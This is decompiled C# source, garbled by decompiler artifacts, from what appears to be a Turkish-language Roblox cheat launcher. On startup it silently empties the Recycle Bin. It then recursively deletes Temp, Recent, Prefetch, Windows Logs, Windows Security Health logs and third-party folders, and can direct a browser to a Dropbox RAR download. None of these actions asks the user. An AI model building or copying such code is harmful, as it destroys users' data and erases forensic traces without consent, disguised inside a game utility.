using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;
using ns1;

namespace ns2
{
	// Token: 0x02000008 RID: 8
	[DesignerGenerated]
	public partial class GForm0 : Form
	{
		// Token: 0x0600001A RID: 26 RVA: 0x000020F8 File Offset: 0x000002F8
		public GForm0()
		{
			base.Load += this.Form1_Load;
			this.InitializeComponent();
		}

		// Token: 0x0600001B RID: 27
		[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SHEmptyRecycleBinA(int hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszRootPath, int dwFlags);

		// Token: 0x0600001C RID: 28
		[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SHUpdateRecycleBinIcon();

		// Token: 0x0600001D RID: 29 RVA: 0x0000293C File Offset: 0x00000B3C
		private void Form1_Load(object sender, EventArgs e)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_02:
				ProjectData.ClearProjectError();
				num = -2;
				IL_0A:
				int num2 = 2;
				this.Timer2.Start();
				IL_17:
				num2 = 3;
				this.UPDATE2.Stop();
				IL_24:
				num2 = 4;
				if (!MyProject.Computer.Network.IsAvailable)
				{
					goto IL_69;
				}
				IL_37:
				num2 = 5;
				int hWnd = base.Handle.ToInt32();
				string text = null;
				GForm0.SHEmptyRecycleBinA(hWnd, ref text, 1);
				IL_54:
				num2 = 6;
				GForm0.SHUpdateRecycleBinIcon();
				IL_5C:
				num2 = 7;
				this.CheckForUpdates();
				goto IL_109;
				IL_69:
				num2 = 9;
				int hWnd2 = base.Handle.ToInt32();
				text = null;
				GForm0.SHEmptyRecycleBinA(hWnd2, ref text, 1);
				IL_87:
				num2 = 10;
				GForm0.SHUpdateRecycleBinIcon();
				IL_90:
				num2 = 11;
				this.Timer3.Start();
				IL_9E:
				num2 = 12;
				Interaction.MsgBox("Bişeyler Bozuk Gidiyor !", MsgBoxStyle.OkOnly, null);
				IL_AE:
				num2 = 13;
				this.BunifuFlatButton1.Text = "İNTERNET BAĞLANTISI YOK !";
				IL_C1:
				num2 = 14;
				this.BunifuDropdown1.selectedIndex = 4;
				IL_D0:
				num2 = 15;
				this.BunifuCustomLabel1.ForeColor = Color.Red;
				IL_E3:
				num2 = 16;
				this.BunifuCustomLabel1.BackColor = Color.Black;
				IL_F6:
				num2 = 17;
				this.BunifuCustomLabel1.Text = "İNTERNET HATA !!! Ethernet FAILED !!!";
				IL_109:
				num2 = 19;
				this.Timer2.Start();
				IL_117:
				num2 = 20;
				this.Timer1.Start();
				IL_125:
				goto IL_1D0;
				IL_12A:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_18C:
				goto IL_1C5;
				IL_18E:
				num4 = num2;
				if (num <= -2)
				{
					goto IL_12A;
				}
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_1A3:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_18E;
			}
			IL_1C5:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_1D0:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00002B40 File Offset: 0x00000D40
		public void CheckForUpdates()
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_02:
				ProjectData.ClearProjectError();
				num = -2;
				IL_0A:
				int num2 = 2;
				this.Refresh();
				IL_12:
				num2 = 3;
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://dl.dropbox.com/s/upwikchd805y5lm/version.txt?dl=0");
				IL_24:
				num2 = 4;
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				IL_33:
				num2 = 5;
				StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				IL_43:
				num2 = 6;
				string text = streamReader.ReadToEnd();
				IL_4E:
				num2 = 7;
				string productVersion = Application.ProductVersion;
				IL_57:
				num2 = 8;
				if (text.Contains(productVersion))
				{
					goto IL_1CB;
				}
				IL_67:
				num2 = 10;
				this.Refresh();
				IL_70:
				num2 = 11;
				this.BunifuCustomLabel1.Text = "Servers are Off ! Sunucular Kapalı ! ";
				IL_83:
				num2 = 12;
				this.BunifuCustomLabel1.ForeColor = Color.Red;
				IL_96:
				num2 = 13;
				this.BunifuCustomLabel1.BackColor = Color.Black;
				IL_A9:
				num2 = 14;
				Interaction.MsgBox("Güncelleme Gelmiş Veya Program Bakım'da Olabilir ;) Kontrol Ediniz...", MsgBoxStyle.OkOnly, null);
				IL_B9:
				num2 = 15;
				base.Show();
				IL_C2:
				num2 = 16;
				MyProject.Forms.rbx.Hide();
				IL_D4:
				num2 = 17;
				this.update1.Start();
				IL_E2:
				num2 = 18;
				this.BunifuFlatButton1.Text = "GÜNCELLEME VAR ! VEYA BAKIM";
				IL_F5:
				num2 = 19;
				this.Timer3.Start();
				IL_103:
				num2 = 20;
				this.BunifuDropdown1.selectedIndex = 4;
				IL_112:
				num2 = 21;
				MyProject.Forms.rbx.ProgressBar2.Value = 0;
				IL_12A:
				num2 = 22;
				MyProject.Forms.rbx.ProgressBar1.Value = 0;
				IL_142:
				num2 = 23;
				base.Show();
				IL_14B:
				num2 = 24;
				MyProject.Forms.rbx.Hide();
				IL_15D:
				num2 = 25;
				MyProject.Forms.rbx.Timer1.Stop();
				IL_174:
				num2 = 26;
				MyProject.Forms.rbx.Timer2.Stop();
				IL_18B:
				num2 = 27;
				MyProject.Forms.Form4.Close();
				IL_19D:
				num2 = 28;
				MyProject.Forms.u.Close();
				IL_1AF:
				num2 = 29;
				this.Refresh();
				IL_1B8:
				num2 = 30;
				this.WebBrowser1.Navigate("https://dl.dropbox.com/s/1zvikip5vqhbobk/TH3KEN%20Roblox%20X.rar?dl=0");
				IL_1CB:
				goto IL_2A5;
				IL_1D0:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_25E:
				goto IL_29A;
				IL_260:
				num4 = num2;
				if (num <= -2)
				{
					goto IL_1D0;
				}
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_278:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_260;
			}
			IL_29A:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_2A5:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002118 File Offset: 0x00000318
		private void BunifuTextbox1_OnTextChange(object sender, EventArgs e)
		{
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00002118 File Offset: 0x00000318
		private void BunifuRating1_onValueChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000021 RID: 33 RVA: 0x0000211A File Offset: 0x0000031A
		[MethodImpl(MethodImplOptions.NoOptimization)]
		private void BunifuTileButton1_Click(object sender, EventArgs e)
		{
			ProjectData.EndApp();
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00002E18 File Offset: 0x00001018
		private void Timer1_Tick(object sender, EventArgs e)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_02:
				ProjectData.ClearProjectError();
				num = -2;
				IL_0A:
				int num2 = 2;
				this.ProgressBar1.Increment(3);
				IL_18:
				num2 = 3;
				if (this.ProgressBar1.Value != 100)
				{
					goto IL_57;
				}
				IL_2B:
				num2 = 4;
				this.Timer1.Stop();
				IL_38:
				num2 = 5;
				this.ProgressBar1.Value = 0;
				IL_46:
				num2 = 6;
				MyProject.Forms.rbx.Show();
				IL_57:
				goto IL_CB;
				IL_59:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_87:
				goto IL_C0;
				IL_89:
				num4 = num2;
				if (num <= -2)
				{
					goto IL_59;
				}
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_9E:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_89;
			}
			IL_C0:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_CB:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00002F08 File Offset: 0x00001108
		private void Timer2_Tick(object sender, EventArgs e)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_02:
				ProjectData.ClearProjectError();
				num = -2;
				IL_0A:
				int num2 = 2;
				Directory.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp", true);
				IL_26:
				num2 = 3;
				Directory.Delete("C:\\Users\\" + Environment.UserName + "\\Recent\\", true);
				IL_42:
				num2 = 4;
				Directory.Delete("C:\\Windows\\prefetch\\", true);
				IL_4F:
				num2 = 5;
				Directory.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\CrashDumps", true);
				IL_6B:
				num2 = 6;
				Directory.Delete("C:\\Windows\\Logs", true);
				IL_78:
				num2 = 7;
				Directory.Delete("C:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Adobe\\Flash Player\\NativeCache", true);
				IL_85:
				num2 = 8;
				Directory.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\CrashReportClient\\Saved\\Logs\\", true);
				IL_A1:
				num2 = 9;
				Directory.Delete("C:\\ProgramData\\IObit\\ASCDownloader\\ASCDownloader", true);
				IL_AF:
				num2 = 10;
				Directory.Delete("C:\\ProgramData\\IObit\\Driver Booster\\Backups", true);
				IL_BD:
				num2 = 11;
				Directory.Delete("C:\\ProgramData\\IObit\\Driver Booster\\Download", true);
				IL_CB:
				num2 = 12;
				Directory.Delete("C:\\ProgramData\\Intel\\Package Cache", true);
				IL_D9:
				num2 = 13;
				Directory.Delete("C:\\ProgramData\\Microsoft\\Windows Security Health\\Logs", true);
				IL_E7:
				goto IL_176;
				IL_EC:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_132:
				goto IL_16B;
				IL_134:
				num4 = num2;
				if (num <= -2)
				{
					goto IL_EC;
				}
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_149:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_134;
			}
			IL_16B:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_176:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x0000211A File Offset: 0x0000031A
		[MethodImpl(MethodImplOptions.NoOptimization)]
		private void Timer3_Tick(object sender, EventArgs e)
		{
			ProjectData.EndApp();
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00002121 File Offset: 0x00000321
		private void update1_Tick(object sender, EventArgs e)
		{
			MyProject.Forms.rbx.ProgressBar1.Value = 0;
			MyProject.Forms.rbx.ProgressBar2.Value = 0;
			base.Show();
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00002153 File Offset: 0x00000353
		private void UPDATE2_Tick(object sender, EventArgs e)
		{
			this.CheckForUpdates();
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00002118 File Offset: 0x00000318
		private void BunifuFlatButton1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x0600002A RID: 42 RVA: 0x0000215B File Offset: 0x0000035B
		// (set) Token: 0x0600002B RID: 43 RVA: 0x00002163 File Offset: 0x00000363
		internal virtual BunifuCustomLabel BunifuCustomLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x0600002C RID: 44 RVA: 0x0000216C File Offset: 0x0000036C
		// (set) Token: 0x0600002D RID: 45 RVA: 0x00003B30 File Offset: 0x00001D30
		internal virtual BunifuFlatButton BunifuFlatButton1
		{
			[CompilerGenerated]
			get
			{
				return this._BunifuFlatButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.BunifuFlatButton1_Click);
				BunifuFlatButton bunifuFlatButton = this._BunifuFlatButton1;
				if (bunifuFlatButton != null)
				{
					bunifuFlatButton.Click -= value2;
				}
				this._BunifuFlatButton1 = value;
				bunifuFlatButton = this._BunifuFlatButton1;
				if (bunifuFlatButton != null)
				{
					bunifuFlatButton.Click += value2;
				}
			}
		}

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x0600002E RID: 46 RVA: 0x00002174 File Offset: 0x00000374
		// (set) Token: 0x0600002F RID: 47 RVA: 0x0000217C File Offset: 0x0000037C
		internal virtual BunifuProgressBar BunifuProgressBar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x06000030 RID: 48 RVA: 0x00002185 File Offset: 0x00000385
		// (set) Token: 0x06000031 RID: 49 RVA: 0x0000218D File Offset: 0x0000038D
		internal virtual PictureBox PictureBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x06000032 RID: 50 RVA: 0x00002196 File Offset: 0x00000396
		// (set) Token: 0x06000033 RID: 51 RVA: 0x0000219E File Offset: 0x0000039E
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000034 RID: 52 RVA: 0x000021A7 File Offset: 0x000003A7
		// (set) Token: 0x06000035 RID: 53 RVA: 0x000021AF File Offset: 0x000003AF
		internal virtual BunifuDropdown BunifuDropdown1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x06000036 RID: 54 RVA: 0x000021B8 File Offset: 0x000003B8
		// (set) Token: 0x06000037 RID: 55 RVA: 0x000021C0 File Offset: 0x000003C0
		internal virtual BunifuCustomLabel BunifuCustomLabel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x06000038 RID: 56 RVA: 0x000021C9 File Offset: 0x000003C9
		// (set) Token: 0x06000039 RID: 57 RVA: 0x00003B74 File Offset: 0x00001D74
		internal virtual BunifuTileButton BunifuTileButton1
		{
			[CompilerGenerated]
			get
			{
				return this._BunifuTileButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.BunifuTileButton1_Click);
				BunifuTileButton bunifuTileButton = this._BunifuTileButton1;
				if (bunifuTileButton != null)
				{
					bunifuTileButton.Click -= value2;
				}
				this._BunifuTileButton1 = value;
				bunifuTileButton = this._BunifuTileButton1;
				if (bunifuTileButton != null)
				{
					bunifuTileButton.Click += value2;
				}
			}
		}

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x0600003A RID: 58 RVA: 0x000021D1 File Offset: 0x000003D1
		// (set) Token: 0x0600003B RID: 59 RVA: 0x00003BB8 File Offset: 0x00001DB8
		internal virtual Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x0600003C RID: 60 RVA: 0x000021D9 File Offset: 0x000003D9
		// (set) Token: 0x0600003D RID: 61 RVA: 0x000021E1 File Offset: 0x000003E1
		internal virtual ProgressBar ProgressBar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x0600003E RID: 62 RVA: 0x000021EA File Offset: 0x000003EA
		// (set) Token: 0x0600003F RID: 63 RVA: 0x00003BFC File Offset: 0x00001DFC
		internal virtual Timer Timer2
		{
			[CompilerGenerated]
			get
			{
				return this._Timer2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				Timer timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer2 = value;
				timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x06000040 RID: 64 RVA: 0x000021F2 File Offset: 0x000003F2
		// (set) Token: 0x06000041 RID: 65 RVA: 0x000021FA File Offset: 0x000003FA
		internal virtual WebBrowser WebBrowser1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700001D RID: 29
		// (get) Token: 0x06000042 RID: 66 RVA: 0x00002203 File Offset: 0x00000403
		// (set) Token: 0x06000043 RID: 67 RVA: 0x00003C40 File Offset: 0x00001E40
		internal virtual Timer Timer3
		{
			[CompilerGenerated]
			get
			{
				return this._Timer3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer3_Tick);
				Timer timer = this._Timer3;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer3 = value;
				timer = this._Timer3;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x06000044 RID: 68 RVA: 0x0000220B File Offset: 0x0000040B
		// (set) Token: 0x06000045 RID: 69 RVA: 0x00003C84 File Offset: 0x00001E84
		internal virtual Timer update1
		{
			[CompilerGenerated]
			get
			{
				return this._update1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.update1_Tick);
				Timer update = this._update1;
				if (update != null)
				{
					update.Tick -= value2;
				}
				this._update1 = value;
				update = this._update1;
				if (update != null)
				{
					update.Tick += value2;
				}
			}
		}

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x06000046 RID: 70 RVA: 0x00002213 File Offset: 0x00000413
		// (set) Token: 0x06000047 RID: 71 RVA: 0x00003CC8 File Offset: 0x00001EC8
		internal virtual Timer UPDATE2
		{
			[CompilerGenerated]
			get
			{
				return this._UPDATE2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UPDATE2_Tick);
				Timer update = this._UPDATE2;
				if (update != null)
				{
					update.Tick -= value2;
				}
				this._UPDATE2 = value;
				update = this._UPDATE2;
				if (update != null)
				{
					update.Tick += value2;
				}
			}
		}

		// Token: 0x0400000B RID: 11
		private const int SHERB_NOCONFIRMATION = 1;

		// Token: 0x0400000C RID: 12
		private const int SHERB_NOPROGRESSUI = 2;

		// Token: 0x0400000D RID: 13
		private const int SHERB_NOSOUND = 4;
	}
}
